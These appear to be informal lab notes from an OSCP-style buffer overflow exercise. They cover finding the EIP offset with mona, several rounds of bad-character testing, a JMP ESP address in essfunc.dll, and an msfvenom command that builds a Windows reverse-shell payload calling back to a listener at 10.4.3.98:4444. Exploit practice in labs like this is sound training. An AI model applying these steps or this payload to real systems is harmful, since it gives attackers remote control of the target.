### EIP
400bytes

!mona findmsp -distance 800

Log data, item 18
 Address=0BADF00D
 Message=    EIP contains normal pattern : 0x356b4134 (offset 314)

BBBB verified 

### Bad chars
##### Round 1
!mona bytearray -b "\x00"
ESP 0183FA30
!mona compare -f C:\mona\oscp\bytearray.bin -a 0183FA30

00 01 02 03 04 16 17 2f 30 f4 f5 fd
00 01 02 03 04 16 17 2f 30 f4 f5 fd

\x00\x01\x02\x03\x16\x2f\xf4\xfd

##### Round 2

!mona bytearray -b "\x00\x16\x2f\xf4\xfd"

ESP 019DFA30
!mona compare -f C:\mona\oscp\bytearray.bin -a 019DFA30


00 01 02 03 04 16 2f f4 fd

##### Round 3
just try \x01

!mona bytearray -b "\x00\x01\x16\x2f\xf4\xfd"

01A6FA30
!mona compare -f C:\mona\oscp\bytearray.bin -a 01A6FA30

00 01 02 03 04 05 16 2f f4 fd


##### Round 4
Okay, i see. they don't have to be bad chars. but mona want them to be filtered.

\x00\x01\x02\x03\x04\x05\x16\x2f\xf4\xfd

!mona bytearray -b "\x00\x01\x02\x03\x04\x05\x16\x2f\xf4\xfd"

0186FA30
!mona compare -f C:\mona\oscp\bytearray.bin -a 0186FA30

00 01 02 03 04 05 06 07 08 09 16 2f f4 fd


\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x16\x2f\xf4\xfd

##### Round 5 maybe it's endless. just no ending
!mona bytearray -b "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x16\x2f\xf4\xfd"

018EFA30




!mona compare -f C:\mona\oscp\bytearray.bin -a 01B8FA30


00 01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 16 2f f4 fd


##### JMP ESP
!mona jmp -r esp -cpb "\x00\x16\x2f\xf4\xfd"

Log data, item 11
 Address=625011AF
 Message=  0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\admin\Desktop\vulnerable-apps\oscp\essfunc.dll)

625011AF
\xaf\x11\x50\x62

msfvenom -p windows/shell_reverse_tcp LHOST=10.4.3.98 LPORT=4444 EXITFUNC=thread -b "\x00\x16\x2f\xf4\xfd" -f c

# Final note
When they are too much naguty chars. Make sure using the bad chars only not includes everthing.